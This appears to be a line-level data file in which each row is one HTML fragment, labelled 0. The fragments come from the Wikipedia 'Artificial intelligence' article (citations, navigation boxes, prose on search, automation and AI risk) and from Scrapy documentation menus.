+"	 </span></a></dt><dd>Learn how to configure Scrapy and see all <a class=""hoverxref reference internal"" data-doc=""topics/settings"" data-project=""scrapy"" data-section=""topics-settings-ref"" data-version=""latest"" href=""topics/settings.html#topics-settings-ref""><span class=""std std-ref"">available settings",0
+"<p>Many problems in AI can be solved in theory by intelligently searching through many possible solutions:<sup id=""cite_ref-Search_185-0"" class=""reference""><a href=""#cite_note-Search-185"">&#91;181&#93; </a> </sup> <a href=""#Deduction,_reasoning,_problem_solving"">Reasoning </a> can be reduced to performing a search. For example, logical proof can be viewed as searching for a path that leads from <a href=""/wiki/Premise"" title=""Premise"">premises </a> to <a href=""/wiki/Logical_consequence"" title=""Logical consequence"">conclusions </a>, where each step is the application of an <a href=""/wiki/Inference_rule"" class=""mw-redirect"" title=""Inference rule"">inference rule </a>.<sup id=""cite_ref-Logic_as_search_186-0"" class=""reference""><a href=""#cite_note-Logic_as_search-186"">&#91;182&#93; </a> </sup> <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Planning </a> algorithms search through trees of goals and subgoals, attempting to find a path to a target goal, a process called <a href=""/wiki/Means-ends_analysis"" title=""Means-ends analysis"">means-ends analysis </a>.<sup id=""cite_ref-Planning_as_search_187-0"" class=""reference""><a href=""#cite_note-Planning_as_search-187"">&#91;183&#93; </a> </sup> <a href=""/wiki/Robotics"" title=""Robotics"">Robotics </a> algorithms for moving limbs and grasping objects use <a href=""/wiki/Local_search_(optimization)"" title=""Local search (optimization)"">local searches </a> in <a href=""/wiki/Configuration_space_(physics)"" title=""Configuration space (physics)"">configuration space </a>.<sup id=""cite_ref-Configuration_space_129-1"" class=""reference""><a href=""#cite_note-Configuration_space-129"">&#91;126&#93; </a> </sup> Many <a href=""/wiki/Machine_learning"" title=""Machine learning"">learning </a> algorithms use search algorithms based on <a href=""/wiki/Optimization_(mathematics)"" class=""mw-redirect"" title=""Optimization (mathematics)"">optimization </a>.",0
+"<a href=""/wiki/Joseph_Weizenbaum"" title=""Joseph Weizenbaum"">Joseph Weizenbaum </a>'s critique of AI:",0
+"<li><a href=""/wiki/Glossary_of_engineering"" title=""Glossary of engineering"">Engineering </a> </li>",0
+"	 </span> <span class=""reference-text""><a href=""#CITEREFLighthill1973"">Lighthill 1973 </a>. ",0
+"	 </span> <span class=""reference-text""><cite class=""citation journal"">Schmidhuber, J. (2015). ""Deep Learning in Neural Networks: An Overview"". <i>Neural Networks </i>. <b>61 </b>: 85–117. <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1404.7828"">1404.7828 </a> ",0
+"	 </span> <span class=""reference-text""><cite class=""citation web"">Administrator. <a rel=""nofollow"" class=""external text"" href=""http://www.i-programmer.info/news/105-artificial-intelligence/2176-kinects-ai-breakthrough-explained.html"">""Kinect's AI breakthrough explained"" </a>. <i>i-programmer.info </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160201031242/http://www.i-programmer.info/news/105-artificial-intelligence/2176-kinects-ai-breakthrough-explained.html"">Archived </a> from the original on 1 February 2016. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=i-programmer.info&amp;rft.atitle=Kinect%27s+AI+breakthrough+explained&amp;rft.au=Administrator&amp;rft_id=http%3A%2F%2Fwww.i-programmer.info%2Fnews%2F105-artificial-intelligence%2F2176-kinects-ai-breakthrough-explained.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"  <div class=""wy-grid-for-nav"">",0
+"	 </span> <span class=""reference-text""><cite class=""citation journal"">Kaplan, Andreas; Haenlein, Michael (1 January 2019). ""Siri, Siri, in my hand: Who's the fairest in the land? On the interpretations, illustrations, and implications of artificial intelligence"". <i>Business Horizons </i>. <b>62 </b> (1): 15–25. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.bushor.2018.08.004"">10.1016/j.bushor.2018.08.004 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Business+Horizons&amp;rft.atitle=Siri%2C+Siri%2C+in+my+hand%3A+Who%27s+the+fairest+in+the+land%3F+On+the+interpretations%2C+illustrations%2C+and+implications+of+artificial+intelligence&amp;rft.volume=62&amp;rft.issue=1&amp;rft.pages=15-25&amp;rft.date=2019-01-01&amp;rft_id=info%3Adoi%2F10.1016%2Fj.bushor.2018.08.004&amp;rft.aulast=Kaplan&amp;rft.aufirst=Andreas&amp;rft.au=Haenlein%2C+Michael&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><a href=""/wiki/Glossary_of_environmental_science"" title=""Glossary of environmental science"">Environmental science </a> </li>",0
+			</div>,0
+"	 </span>. New York: Harper &amp; Row. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Shape+of+Automation+for+Men+and+Management&amp;rft.place=New+York&amp;rft.pub=Harper+%26+Row&amp;rft.date=1965&amp;rft.aulast=Simon&amp;rft.aufirst=H.+A.&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fshapeofautomatio00simo&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li id=""cite_note-4""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-4"">^ </a> </b> ",0
+" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em""><a href=""/wiki/Category:Metatheory_of_science"" title=""Category:Metatheory of science"">Metatheory<br />of science </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0
+"	 </span>. <i>Infosys </i>. 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">14 January ",0
+"	 </span> <span class=""reference-text""><cite class=""citation web"">Taylor, Patrick. <a rel=""nofollow"" class=""external text"" href=""https://www.forbes.com/sites/forbestechcouncil/2018/05/01/the-robots-are-coming-to-corporate-finance/"">""The Robots Are Coming To Corporate Finance"" </a>. <i>Forbes </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Forbes&amp;rft.atitle=The+Robots+Are+Coming+To+Corporate+Finance&amp;rft.aulast=Taylor&amp;rft.aufirst=Patrick&amp;rft_id=https%3A%2F%2Fwww.forbes.com%2Fsites%2Fforbestechcouncil%2F2018%2F05%2F01%2Fthe-robots-are-coming-to-corporate-finance%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<p>Widespread use of artificial intelligence could have <a href=""/wiki/Unintended_consequences"" title=""Unintended consequences"">unintended consequences </a> that are dangerous or undesirable. Scientists from the <a href=""/wiki/Future_of_Life_Institute"" title=""Future of Life Institute"">Future of Life Institute </a>, among others, described some short-term research goals to see how AI influences the economy, the laws and ethics that are involved with AI and how to minimize AI security risks. In the long-term, the scientists have proposed to continue optimizing function while minimizing possible security risks that come along with new technologies.<sup id=""cite_ref-361"" class=""reference""><a href=""#cite_note-361"">&#91;350&#93; </a> </sup>",0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Friendly_AI"" class=""mw-redirect"" title=""Friendly AI"">Friendly AI </a> </div>",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=How+to+build+complete+creatures+rather+than+isolated+cognitive+simulators&amp;rft.btitle=Architectures+for+Intelligence&amp;rft.place=Hillsdale%2C+NJ&amp;rft.pages=225-239&amp;rft.pub=Lawrence+Erlbaum+Associates&amp;rft.date=1991&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.52.9510&amp;rft.aulast=Brooks&amp;rft.aufirst=R.+A.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;916–932 </li> </ul>",0
+"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://www.wikidata.org/wiki/Q11660"" class=""extiw"" title=""d:Q11660"">Data </a> from Wikidata ",0
+"<li id=""cite_note-FOOTNOTERussellNorvig20091-289""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-FOOTNOTERussellNorvig20091_289-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-FOOTNOTERussellNorvig20091_289-1""><sup><i><b>b </b> </i> </sup> </a> ",0
+"             </li><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Wikidata-logo.svg/27px-Wikidata-logo.svg.png"" decoding=""async"" width=""27"" height=""15"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Wikidata-logo.svg/41px-Wikidata-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Wikidata-logo.svg/54px-Wikidata-logo.svg.png 2x"" data-file-width=""1050"" data-file-height=""590"" /> ",0
+"<li><a href=""/wiki/Robot_software"" title=""Robot software"">Software </a> </li>",0
+"<li id=""cite_note-324""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-324"">^ </a> </b> ",0
+"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Gillick, Dan; Brunk, Cliff; Vinyals, Oriol; Subramanya, Amarnag (2015). ""Multilingual Language Processing From Bytes"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1512.00103"">1512.00103 </a> ",0
+"<li><a href=""/wiki/Ant_colony_optimization"" class=""mw-redirect"" title=""Ant colony optimization"">Ant colony optimization </a> </li>",0
+"<li><a href=""/wiki/Dependability"" title=""Dependability"">Dependability </a> </li> </ul>",0
+"<ul><li><a href=""/wiki/Nick_Bostrom"" title=""Nick Bostrom"">Nick Bostrom </a> </li>",0
+"	 </span> <span class=""reference-text"">Terminology varies; see <a href=""/wiki/Algorithm_characterizations"" title=""Algorithm characterizations"">algorithm characterizations </a>. ",0
+"<li><a href=""/wiki/Probability"" title=""Probability"">Probability </a> </li>",0
+"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=The+Promise+of+Artificial+Intelligence+Unfolds+in+Small+Steps&amp;rft.date=2016-02-28&amp;rft.aulast=Lohr&amp;rft.aufirst=Steve&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2016%2F02%2F29%2Ftechnology%2Fthe-promise-of-artificial-intelligence-unfolds-in-small-steps.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=59"" title=""Edit section: Malevolent and friendly AI"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<li id=""cite_note-283""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-283"">^ </a> </b> ",0
+"<li id=""cite_note-325""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-325"">^ </a> </b> ",0
+"<li id=""cite_note-Hierarchical_control_system-181""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Hierarchical_control_system_181-0"">^ </a> </b> ",0
+"<div class=""div-col columns column-width"" style=""-moz-column-width: 20em; -webkit-column-width: 20em; column-width: 20em;"">",0
+"<li><a href=""/wiki/Engineering_cybernetics"" title=""Engineering cybernetics"">Engineering cybernetics </a> </li>",0
+"      <script type=""text/javascript"" id=""documentation_options"" data-url_root=""./"" src=""_static/documentation_options.js""></script>",0
+"<li id=""cite_note-FOOTNOTEMarkoff2011-45""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEMarkoff2011_45-0"">^ </a> </b> ",0
+"	 </span> <span class=""reference-text"">Wallach, pp 37–54. ",0
+"		<li id=""footer-places-statslink""><a href=""https://stats.wikimedia.org/#/en.wikipedia.org"">Statistics </a> </li>",0
+"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>, collected in <cite class=""citation book""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy, John </a> (1996). ""10. Review of <i>The Question of Artificial Intelligence </i>"". <i>Defending AI Research: A Collection of Essays and Reviews </i>. CSLI. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=10.+Review+of+The+Question+of+Artificial+Intelligence&amp;rft.btitle=Defending+AI+Research%3A+A+Collection+of+Essays+and+Reviews&amp;rft.pub=CSLI&amp;rft.date=1996&amp;rft.aulast=McCarthy&amp;rft.aufirst=John&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<ul><li><a class=""mw-selflink selflink"">Artificial intelligence </a> </li>",0
+"<li class=""toclevel-2 tocsection-11""><a href=""#Motion_and_manipulation""><span class=""tocnumber"">4.7 ",0
+"	 <a href=""/wiki/Moravec%27s_paradox"" title=""Moravec&#39;s paradox"">Moravec's paradox </a> generalizes that low-level sensorimotor skills that humans take for granted are, counterintuitively, difficult to program into a robot; the paradox is named after ",0
+"<li><a href=""/wiki/Competitions_and_prizes_in_artificial_intelligence"" title=""Competitions and prizes in artificial intelligence"">AI competitions </a> </li> </ul>",0
+" </p><p>Recent developments in autonomous automobiles have made the innovation of self-driving trucks possible, though they are still in the testing phase. The UK government has passed legislation to begin testing of self-driving truck platoons in 2018.<sup id=""cite_ref-309"" class=""reference""><a href=""#cite_note-309"">&#91;298&#93; </a> </sup> Self-driving truck platoons are a fleet of self-driving trucks following the lead of one non-self-driving truck, so the truck platoons aren't entirely autonomous yet. Meanwhile, the Daimler, a German automobile corporation, is testing the Freightliner Inspiration which is a semi-autonomous truck that will only be used on the highway.<sup id=""cite_ref-310"" class=""reference""><a href=""#cite_note-310"">&#91;299&#93; </a> </sup>",0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Technological_unemployment#21st_century"" title=""Technological unemployment"">Technological unemployment §&#160;21st century </a> </div>",0
+"<div id=""mw-navigation"">",0
+"          <dd><a href=""/en/0.20/"">0.20</a></dd>",0
+"<ul><li><a href=""#CITEREFWeizenbaum1976"">Weizenbaum 1976 </a> </li>",0
+"<a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">Computational intelligence </a>",0
+"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Computer_science"" title=""Template:Computer science""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Computer_science"" title=""Template talk:Computer science""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Computer_science&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
+"<li><a href=""/wiki/Semiotics"" title=""Semiotics"">Semiotics </a> </li>",0
+"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://www.scmp.com/tech/innovation/article/2098164/robots-are-coming-here-are-some-jobs-wont-exist-10-years"">""Will your job still exist in 10 years when the robots arrive?"" </a>. <i><a href=""/wiki/South_China_Morning_Post"" title=""South China Morning Post"">South China Morning Post </a> </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0
+"<dt><a class=""reference internal"" href=""topics/signals.html""><span class=""doc"">Signals",0
+"<li id=""cite_note-199""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-199"">^ </a> </b> ",0
+"<li><cite id=""CITEREFBuchanan2005"" class=""citation journal"">Buchanan, Bruce G. (2005). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070926023314/http://www.aaai.org/AITopics/assets/PDF/AIMag26-04-016.pdf"">""A (Very) Brief History of Artificial Intelligence"" </a> <span class=""cs1-format"">(PDF) ",0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=52"" title=""Edit section: Devaluation of humanity"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""faq.html"">Frequently Asked Questions</a></li>",0
+"	 </span> <span class=""reference-text""><cite class=""citation book"">Marwala, Tshilidzi; Hurwitz, Evan (2017). <i>Artificial Intelligence and Economic Theory: Skynet in the Market </i>. London: <a href=""/wiki/Springer_Science%2BBusiness_Media"" title=""Springer Science+Business Media"">Springer </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-319-66104-9"" title=""Special:BookSources/978-3-319-66104-9""><bdi>978-3-319-66104-9 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence+and+Economic+Theory%3A+Skynet+in+the+Market&amp;rft.place=London&amp;rft.pub=Springer&amp;rft.date=2017&amp;rft.isbn=978-3-319-66104-9&amp;rft.aulast=Marwala&amp;rft.aufirst=Tshilidzi&amp;rft.au=Hurwitz%2C+Evan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+"<li><a href=""/wiki/Middleware"" title=""Middleware"">Middleware </a> </li>",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""contributing.html"">Contributing to Scrapy</a></li>",0
+"<li><cite id=""CITEREFMinsky2006"" class=""citation book""><a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Minsky, Marvin </a> (2006). <a href=""/wiki/The_Emotion_Machine"" title=""The Emotion Machine""><i>The Emotion Machine </i> </a>. New York, NY: Simon &amp; Schusterl. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-7432-7663-4"" title=""Special:BookSources/978-0-7432-7663-4""><bdi>978-0-7432-7663-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Emotion+Machine&amp;rft.place=New+York%2C+NY&amp;rft.pub=Simon+%26+Schusterl&amp;rft.date=2006&amp;rft.isbn=978-0-7432-7663-4&amp;rft.aulast=Minsky&amp;rft.aufirst=Marvin&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+    </p>,0
+"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=50"" title=""Edit section: Potential harm"">edit </a><span class=""mw-editsection-bracket"">] ",0
+"<h4><span class=""mw-headline"" id=""Robot_rights"">Robot rights ",0
+"<h3><span class=""mw-headline"" id=""Social_intelligence"">Social intelligence ",0
+"<dt><a class=""reference internal"" href=""topics/commands.html""><span class=""doc"">Command line tool",0
+"<div id=""footer"" role=""contentinfo"" >",0
+" </p><p>The potential negative effects of AI and automation were a major issue for <a href=""/wiki/Andrew_Yang"" title=""Andrew Yang"">Andrew Yang </a>'s <a href=""/wiki/Andrew_Yang_2020_presidential_campaign"" title=""Andrew Yang 2020 presidential campaign"">2020 presidential campaign </a> in the United States.<sup id=""cite_ref-362"" class=""reference""><a href=""#cite_note-362"">&#91;351&#93; </a> </sup> Irakli Beridze, Head of the Centre for Artificial Intelligence and Robotics at UNICRI, United Nations, has expressed that ""I think the dangerous applications for AI, from my point of view, would be criminals or large terrorist organizations using it to disrupt large processes or simply do pure harm. [Terrorists could cause harm] via digital warfare, or it could be a combination of robotics, drones, with AI and other things as well that could be really dangerous. And, of course, other risks come from things like job losses. If we have massive numbers of people losing jobs and don't find a solution, it will be extremely dangerous. Things like lethal autonomous weapons systems should be properly governed — otherwise there's massive potential of misuse.""<sup id=""cite_ref-363"" class=""reference""><a href=""#cite_note-363"">&#91;352&#93; </a> </sup>",0
+"<li id=""cite_note-Default_reasoning_and_non-monotonic_logic-105""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Default_reasoning_and_non-monotonic_logic_105-1""><sup><i><b>b </b> </i> </sup> </a> ",0
+"<li><a href=""/wiki/Turing_test"" title=""Turing test"">Turing test </a> </li>",0
+"<ul><li><a rel=""nofollow"" class=""external text"" href=""http://www.ieee-cis.org/"">IEEE Computational Intelligence Society </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/"">Archived </a> 9 May 2008 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> </li> </ul>",0
+"<li>Joe (""<a href=""/wiki/A_Logic_Named_Joe"" title=""A Logic Named Joe"">A Logic Named Joe </a>"", 1946) </li>",0
+}}();,0
+"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",0
+"<li><a href=""#CITEREFBBC_News2006""><i>BBC News </i> 2006 </a> </li> </ul>",0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/install.html"">Installation guide</a></li>",0
+"<li class=""toclevel-2 tocsection-65""><a href=""#Superintelligence""><span class=""tocnumber"">8.5 ",0
+"	 </span> <span class=""reference-text"">Wallach, pp 55–73. ",0
+"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.moma.org/calendar/exhibitions/3863"">""Thinking Machines: Art and Design in the Computer Age, 1959–1989"" </a>. <i>The Museum of Modern Art </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",0
+AI applications widely used behind the scenes:,0
+" <script type=""text/javascript"" src=""_static/js/modernizr.min.js""></script>",0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;653–664, </li>",0
+"<li id=""cite_note-Embodied_AI-167""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Embodied_AI_167-0"">^ </a> </b> ",0
+"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.infosys.com/industries/travel-hospitality/documents/ai-travel-hospitality.pdf"">""Role of AI in travel and Hospitality Industry"" </a> <span class=""cs1-format"">(PDF) ",0
+"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;17–25 </li> </ul>",0
+"<li><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www-formal.stanford.edu/jmc/whatisai/node3.html"">""Applications of AI"" </a>. <i>www-formal.stanford.edu </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">25 September ",0
+"<li><i><a href=""/wiki/Index_of_philosophy_of_mind_articles"" title=""Index of philosophy of mind articles"">more... </a> </i> </li> </ul>",0
+"<li><i><a href=""/wiki/Calculus_ratiocinator"" title=""Calculus ratiocinator"">Calculus ratiocinator </a> </i> and <i><a href=""/wiki/Characteristica_universalis"" title=""Characteristica universalis"">characteristica universalis </a> </i><span class=""nowrap"">&#160; ",0
+"		<div class=""printfooter"">Retrieved from ""<a dir=""ltr"" href=""https://en.wikipedia.org/w/index.php?title=Artificial_intelligence&amp;oldid=945778352"">https://en.wikipedia.org/w/index.php?title=Artificial_intelligence&amp;oldid=945778352 </a>"" </div>",0
+"	 </span> <span class=""reference-text"">McFarland, Matt. ""Google's artificial intelligence breakthrough may have a huge impact on self-driving cars and much more"". <i>The Washington Post </i> 25 February 2015. Infotrac Newsstand. 24 October 2016 ",0
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;790–831 </li>",0
+"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3 </li> </ul>",0
+"	 </span> <span class=""reference-text""><cite class=""citation web"">Pham, Sherisse (24 April 2017). <a rel=""nofollow"" class=""external text"" href=""https://money.cnn.com/2017/04/24/technology/alibaba-jack-ma-30-years-pain-robot-ceo/index.html"">""Jack Ma: In 30 years, the best CEO could be a robot"" </a>. <i>CNNMoney </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=CNNMoney&amp;rft.atitle=Jack+Ma%3A+In+30+years%2C+the+best+CEO+could+be+a+robot&amp;rft.date=2017-04-24&amp;rft.aulast=Pham&amp;rft.aufirst=Sherisse&amp;rft_id=https%3A%2F%2Fmoney.cnn.com%2F2017%2F04%2F24%2Ftechnology%2Falibaba-jack-ma-30-years-pain-robot-ceo%2Findex.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
+	 </span> ,0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;739–748, 758 </li>",0
+" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Early modern </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Deep_learning"" title=""Deep learning"">Deep learning </a> </div>",0
+"<li><a href=""/wiki/Virtual_machine"" title=""Virtual machine"">Virtual machine </a> </li>",0
+"<li class=""toclevel-3 tocsection-51""><a href=""#Existential_risk""><span class=""tocnumber"">8.2.1 ",0
+"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/5/5e/X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg/220px-X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg"" decoding=""async"" width=""220"" height=""308"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/5/5e/X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg/330px-X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/5/5e/X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg/440px-X-ray_of_a_hand_with_automatic_bone_age_calculation.jpg 2x"" data-file-width=""1303"" data-file-height=""1827"" /> </a>  <div class=""thumbcaption"">",0
+"<ul><li><a href=""/wiki/Space_probe"" title=""Space probe"">Space probe </a> </li> </ul> </li>",0
+"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_1-67""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_1_67-0"">^ </a> </b> ",0
+" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Robot_locomotion"" title=""Robot locomotion"">Locomotion </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"<a href=""/wiki/Artificial_brain"" title=""Artificial brain"">Artificial brain </a> arguments: AI requires a simulation of the operation of the human brain",0
+"<li><a href=""/wiki/Glossary_of_botany"" class=""mw-redirect"" title=""Glossary of botany"">Botany </a> </li>",0
+"<li><a href=""/wiki/Statistics"" title=""Statistics"">Statistics </a> </li>",0
+"          <dd><a href=""/en/1.4/"">1.4</a></dd>",0
+"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;251–259 </li>",0
